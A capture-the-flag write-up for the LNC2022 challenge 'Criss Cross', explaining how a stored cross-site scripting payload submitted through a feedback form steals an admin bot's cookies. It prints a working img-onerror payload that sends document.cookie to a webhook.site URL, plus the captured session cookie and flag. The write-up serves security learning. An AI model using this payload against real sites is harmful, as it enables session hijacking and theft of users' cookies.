# Criss Cross

---

## Challenge Description 
I heard that HR got a new selenium bot with some really yummy cookies recently! I wonder if I can get some of those cookies for myself...

http://c1.lagncrash.com:9012

---

## Challenge Solution
Upon visiting the link, we see the following page.

![Screenshot 2022-03-28 040307](https://user-images.githubusercontent.com/101789488/160298703-8ffff3f8-7735-4888-ab62-df280add4a48.png)

From the challenge name, we can link `Criss Cross` to [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/). Additionally, from the challenge description we know that the objective is to get some cookies. Since I had not come across a XSS challenge before, I did some research and found this [writeup](https://ctftime.org/writeup/18736).

Since I was introduced to [webhook](https://webhook.site/) by a friend and this writeup made use of it, I copied the script and changed the URL to my own webhook site:
```
<img 
    src="http://url.to.file.which/not.exist" 
    onerror="fetch(
        'https://webhook.site/775ba4ed-07af-44d8-87e1-4ec710a0ce19', {
            method:'POST', 
            body: JSON.stringify({data:document.cookie})
        }
    );">
```

I then submitted this in the feedback box of the webpage.

![Screenshot 2022-03-28 041732](https://user-images.githubusercontent.com/101789488/160299228-3f2b5103-9099-4ad7-bd96-f45c91e1a42b.png)

From my webhook site, I received the POST request with the raw content:
```
{
  "data": "session=XEBKL85O6P6BZPZQ0BKTWMAXB93NS3H0; flag=TE5DMjAyMntjcjFzc19jcjBzc19zMXRlX3NjcjFwdDFuZ30="
}
```

Looking at the value of the flag, we know that it has been encoded using [Base64](https://en.wikipedia.org/wiki/Base64). As such, we will use a [Base64 decoder](https://www.base64decode.org/) to obtain our flag.
```
LNC2022{cr1ss_cr0ss_s1te_scr1pt1ng}
```